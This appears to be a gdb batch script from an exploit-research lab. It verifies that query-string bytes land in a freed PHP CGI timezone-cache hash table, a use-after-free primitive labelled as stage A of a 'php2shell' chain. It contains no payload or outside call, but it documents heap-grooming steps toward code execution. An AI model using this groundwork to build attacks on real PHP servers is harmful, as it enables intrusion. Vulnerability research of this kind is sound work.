# gdb batch script: prove attacker bytes land in the freed startup tzcache.
#
# Run with the query-string groomer (e.g. QUERY_STRING=XXX=ABCDEFGHIJ) and
# USE_ZEND_ALLOC=0 USE_TRACKED_ALLOC=1 against a *plain* affected CGI build:
#
#   QUERY_STRING='XXX=ABCDEFGHIJ' \
#   gdb -q -batch -x lab/repro/php2shell-stageA-fieldprobe.gdb --args \
#     lab/build/php-8.4.27-plain/sapi/cgi/php-cgi -n -q ... (see proof.sh)
#
# It captures DATEG(tzcache) at its first use (the startup diagnostic), then
# prints every zend_hash_str_find_bucket hit on that same pointer, dumping the
# 56 bytes of the HashTable struct. The first hit shows the live startup table;
# the second hit (the PRE-RINIT session warning) shows the reused chunk with
# the attacker's query-string bytes in the fields the consumer reads.
set pagination off
set confirm off
set auto-load safe-path /
set $tc = 0
break php_date.c:505
commands 1
  silent
  if $tc == 0
    set $tc = date_globals.tzcache
    printf "CAPTURED tc=%p\n", $tc
  end
  continue
end
break zend_hash.c:945 if ht == $tc
commands 2
  silent
  printf "STALE ht=%p flags=%08x mask=%08x arData=%p nNumUsed=%08x nNumOfEl=%08x\n", ht, *(unsigned int*)((char*)ht+8), *(unsigned int*)((char*)ht+12), *(void**)((char*)ht+16), *(unsigned int*)((char*)ht+24), *(unsigned int*)((char*)ht+28)
  x/7gx ht
  continue
end
run
quit
